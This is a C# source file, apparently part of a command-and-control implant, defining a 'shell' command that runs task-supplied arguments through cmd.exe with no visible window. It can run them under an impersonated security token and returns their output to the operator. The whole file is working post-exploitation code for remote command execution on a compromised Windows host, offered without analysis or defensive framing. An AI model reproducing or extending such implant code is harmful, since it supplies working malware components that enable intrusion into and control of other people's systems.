using Agent.Helpers;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WinAPI.Wrapper;

namespace Agent.Commands
{
    public class ShellCommand : AgentCommand
    {
        public override string Name => "shell";
        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            //cmd.exe /c <command>
            var cmd = $@"c:\windows\system32\cmd.exe /c {task.Arguments}";

            var winAPI = WinAPIWrapper.CreateInstance();

            var creationParms = new ProcessCreationParameters()
            {
                Command = cmd,
                RedirectOutput = true,
                CreateNoWindow = true,
                CurrentDirectory = Environment.CurrentDirectory
            };

            if (ImpersonationHelper.HasCurrentImpersonation)
                creationParms.Token = ImpersonationHelper.ImpersonatedToken;

            var procResult = winAPI.CreateProcess(creationParms);

            if (procResult.ProcessId == 0)
            {
                context.Error("Process start failed!");
                return;
            }

            if (creationParms.RedirectOutput)
                winAPI.ReadPipeToEnd(procResult.ProcessId, procResult.OutPipeHandle, output => context.AppendResult(output, false));

           
        }
    }
}
